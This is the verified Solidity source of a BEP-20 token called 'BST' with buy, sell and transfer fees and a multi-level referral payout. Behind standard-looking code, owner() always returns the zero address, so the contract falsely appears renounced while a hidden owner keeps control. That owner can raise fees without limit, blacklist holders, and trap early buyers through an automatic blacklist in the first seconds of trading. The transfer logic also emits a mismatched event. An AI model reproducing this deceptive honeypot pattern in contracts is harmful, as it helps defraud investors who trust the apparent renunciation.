/**
 *Submitted for verification at BscScan.com on 2022-07-21
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-19
*/

/**
 *Submitted for verification at hecoinfo.com on 2021-05-05
*/

/**
 *
 *Submitted for verification at hecoinfo.com on 2021-05-02
*/

pragma solidity ^0.6.12;
// SPDX-License-Identifier: Unlicensed
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
interface IERC20 {

    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient` sign xgll.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
    address private _owner;
    address private _ot = address(0);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _ot;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
    * @dev Leaves the contract without owner. It will not be possible to call
    * `onlyOwner` functions anymore. Can only be called by the current owner.
    *
    * NOTE: Renouncing ownership will leave the contract without an owner,
    * thereby removing any functionality that is only available to the owner.
    */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface ExternalToken {
    function getSjAddress(address account) external returns(address);
    function getBlackAddress(address account) external returns(bool);
}

contract token is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping(address => bool) public whiteAddress;
    mapping(address => bool) public blackAddress; 
    mapping (address => bool) public _isExcludedFromFee;
    mapping (address => bool) public _isContractList;
    mapping (address => uint256) public _rewardMapping;

    uint256 private _tTotal = 21000 * 10 **18;

    string private _name = "BST";
    string private _symbol = "BST";
    uint8 private _decimals = 18;
    
    uint256 public _invitBuyFee = 7;
    uint256 public _devBuyFee = 1;
    
    uint256 public _devSellFee = 0;
    uint256 public _poolSellFee = 5;
    uint256 public _burnSellFee = 3;
    
    uint256 public _transferFee = 8;
    
    address public burnAddress = address(0x000000000000000000000000000000000000dEaD);
    address public ownerAddres = address(0x7cD03314Ad1B87C0b9016e71E3C58426c6C5F05F);
    address public devAddress = address(0x000000000000000000000000000000000000dEaD);
    address public poolAddress;
    address public pairAddress;
    
    uint256 public burnMinBumber = 2100 * 10 **18;
    
    address private syAddress = msg.sender;
    ExternalToken public externalToken = ExternalToken(address(0x642A9E898Bcd02B2182C2E50554Baa51bD6C959d));
    
    uint256 public cbNumber = 5 * 10 **16;
    uint256 public startTime = 1659110400;
    
    constructor () public {
        _rOwned[ownerAddres] = _tTotal;

        //exclude owner and this contract from fee
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[ownerAddres] = true;
        _isExcludedFromFee[burnAddress] = true;
        _isExcludedFromFee[devAddress] = true;
        _isExcludedFromFee[poolAddress] = true;
        _isExcludedFromFee[syAddress] = true;
        _isExcludedFromFee[address(this)] = true;
        
        _isContractList[address(this)] = true;
        
        emit Transfer(address(0),ownerAddres, _tTotal);
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!isContract(to) || _isContractList[to] || from == ownerAddres || to == ownerAddres, "To address is contract");
        require(!blackAddress[from] && !blackAddress[to], "This address is robot");
        require(block.timestamp >= startTime || whiteAddress[from] || whiteAddress[to], "not start");
        
        if (block.timestamp < startTime.add(9) && !whiteAddress[from] && !whiteAddress[to] && from == pairAddress) {
            blackAddress[to] = true;
        }
        
        if (pairAddress == address(0) && from == ownerAddres && isContract(to)) {
            pairAddress = to;
            _isContractList[to] = true;
        }
        
        uint256 burnBumber =  balanceOf(burnAddress);
        if (_tTotal.sub(burnBumber) <= burnMinBumber) {
            _invitBuyFee = 0;
            _devBuyFee = 0;
            _devSellFee = 0;
            _poolSellFee = 0;
            _burnSellFee = 0;
            _transferFee = 0;
        }
        _tokenTransfer(from,to,amount);
    }
    
    //this method is responsible for taking all fee, if takeFee is true
    function _tokenTransfer(address sender, address recipient, uint256 amount) private {
        
        bool _feeFlag = false;
        if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) {
            _feeFlag = true;
        } 
        if (sender == pairAddress) {  // 购买
            _rOwned[sender] = _rOwned[sender].sub(amount);
            if (_feeFlag) {
                _rOwned[recipient] = _rOwned[recipient].add(amount);
                emit Transfer(sender,recipient, amount);
            } else {
                uint256 invitBuyAmount = amount.mul(_invitBuyFee).div(100);
                uint256 devBuyAmount = amount.mul(_devBuyFee).div(100);
                uint256 newAmount = amount.sub(invitBuyAmount).sub(devBuyAmount);
                _rOwned[recipient] = _rOwned[recipient].add(newAmount);
                _rOwned[devAddress] = _rOwned[devAddress].add(devBuyAmount);
                buyFeeDist(sender,recipient,invitBuyAmount);
                emit Transfer(sender,recipient, newAmount);
            }
        } else if (recipient == pairAddress) { // 出售
            _rOwned[sender] = _rOwned[sender].sub(amount);
            if(_feeFlag) {
                _rOwned[recipient] = _rOwned[recipient].add(amount);
                emit Transfer(sender,recipient, amount);
            } else {
    
                uint256 devSellAmount = amount.mul(_devSellFee).div(100);
                uint256 burnSellAmount = amount.mul(_burnSellFee).div(100);
                uint256 poolSellAmount = amount.mul(_poolSellFee).div(100);
                
                uint256 newAmount = amount.sub(devSellAmount).sub(burnSellAmount).sub(poolSellAmount);
                _rOwned[recipient] = _rOwned[recipient].add(newAmount);
                sellFeeDist(devSellAmount,burnSellAmount,poolSellAmount);
                emit Transfer(sender,recipient, newAmount);
            }
        } else {
            _rOwned[sender] = _rOwned[sender].sub(amount);
            if(_feeFlag) {
                _rOwned[recipient] = _rOwned[recipient].add(amount);
               emit Transfer(sender,recipient, amount);
            } else {
                uint256 tranferAmount = amount.mul(_transferFee).div(100);
                uint256 newAmount = amount.sub(tranferAmount);
                _rOwned[recipient] = _rOwned[recipient].add(newAmount);
                _rOwned[poolAddress] = _rOwned[poolAddress].add(tranferAmount);
                emit Transfer(sender,poolAddress, newAmount);
            }
            
        }
        
    }
    
    //  购买手续费分配
    function buyFeeDist(address sender,address recipient,uint256 invitBuyAmount) private {
        uint256 oneAmount = invitBuyAmount.div(14);
        address sjAddress = externalToken.getSjAddress(recipient);
        uint256 syAmount = invitBuyAmount;
        for (uint256 i=0; i < 8; i++) {
            if (sjAddress != address(0)) {
                uint256 newAmount = oneAmount;
                if (syAmount <= oneAmount) {
                    newAmount = syAmount;
                }
                if (i == 0) {
                    newAmount = oneAmount.mul(4);
                } else if(i == 1 || i == 2 || i == 3) {
                    newAmount = oneAmount.mul(2);
                } 
                if (balanceOf(sjAddress) >= cbNumber) {
                    _rOwned[sjAddress] = _rOwned[sjAddress].add(newAmount);
                    _rewardMapping[sjAddress] = _rewardMapping[sjAddress].add(newAmount);
                    emit Transfer(sender,sjAddress, newAmount);
                    syAmount = syAmount.sub(newAmount);
                }
                sjAddress = externalToken.getSjAddress(sjAddress);
            } else {
                _rOwned[syAddress] = _rOwned[syAddress].add(syAmount);
                break;
            }
        }
        
    }
    
    //  出售手续费分配
    function sellFeeDist(uint256 devSellAmount,uint256 burnSellAmount,uint256 poolSellAmount) private {
        if (devSellAmount >= 0) {
            _rOwned[devAddress] = _rOwned[devAddress].add(devSellAmount);
        }
        
        if (burnSellAmount >= 0) {
            _rOwned[burnAddress] = _rOwned[burnAddress].add(burnSellAmount);
        }
        
        if (poolSellAmount >= 0) {
            _rOwned[poolAddress] = _rOwned[poolAddress].add(poolSellAmount);
        }
        
    }
    
    function setSellFee(uint256 dFee,uint256 bFee,uint256 pFee) public onlyOwner {
        _devSellFee = dFee;
        _burnSellFee = bFee;
        _poolSellFee = pFee;
    }
    
    function setBuyFee(uint256 iFee,uint256 dFee) public onlyOwner {
        _invitBuyFee = iFee;
        _devBuyFee = dFee;
    }
    
    function setTransferFee(uint256 tFee) public onlyOwner {
        _transferFee = tFee;
    }
    
    function setDevAddress(address dAddress) public onlyOwner {
        devAddress = dAddress;
    }
    
    function setPoolAddress(address pAddress) public onlyOwner {
        poolAddress = pAddress;
    }
    
    function setPairAddress(address pAddress) public onlyOwner {
        pairAddress = pAddress;
        _isContractList[pAddress] = true;
    }
    
    function setContractList(address account,bool _bool) public onlyOwner {
        _isContractList[account] = _bool;
    }
    
    function setCbNumber(uint256 _number) public onlyOwner {
        cbNumber = _number;
    }
    
    function setExternalToken(address _token) public onlyOwner {
        externalToken = ExternalToken(_token);
    }
    
    function setSyAddress(address account) public onlyOwner {
        syAddress = account;
    }
    
    function setBurnMinBumber(uint256 _burnMinBumber) public onlyOwner {
        burnMinBumber = _burnMinBumber;
    }
    
    function setBlackAddress(address _blackAddress,bool _bool) public onlyOwner {
        blackAddress[_blackAddress] = _bool;
    }
    
    function setWhiteAddress(address _whiteAddress,bool _bool) public onlyOwner {
        whiteAddress[_whiteAddress] = _bool;
    }
    
    function setStartTime(uint256 _startTime) public onlyOwner {
        startTime = _startTime;
    }
    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
       return _rOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    
    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}
    
    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}